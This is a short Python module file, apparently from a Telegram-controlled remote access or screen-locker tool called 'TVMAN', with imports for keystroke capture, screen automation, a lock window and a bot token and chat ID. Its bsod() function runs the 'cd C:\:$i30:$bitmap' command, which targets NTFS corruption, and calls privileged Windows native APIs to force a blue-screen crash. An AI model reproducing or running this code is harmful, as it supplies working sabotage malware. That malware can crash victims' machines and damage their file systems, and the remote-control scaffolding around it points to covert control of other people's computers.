# TVMAN MODULES FILE

# IMPORTS
import telepot
import requests
import subprocess
import threading
import ctypes
import ctypes.wintypes
import os
import json
import re
import keyboard
import time
import logging
import sys
from datetime import datetime

# chebeslock specific
import pyautogui
from tkinter import (
    Tk,
    Entry,
    END,
    CENTER,
    Button,
    Label,
    Frame,
    LEFT,
    messagebox,
    TclError,
)
from functools import partial
import itertools as its


# shared functions


def bsod():
    """Hard stuff. don't play with it unless you know what it does."""
    subprocess.call("cd C:\:$i30:$bitmap", shell=True)
    ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))
    ctypes.windll.ntdll.NtRaiseHardError(
        0xC0000022, 0, 0, 0, 6, ctypes.byref(ctypes.wintypes.DWORD())
    )


TMP = f'{os.path.expanduser("~")}\\AppData\\Local\\Temp\\'  # Temp Directory


TOKEN: str # put token from botfather
CHATID: int # put the chatid here
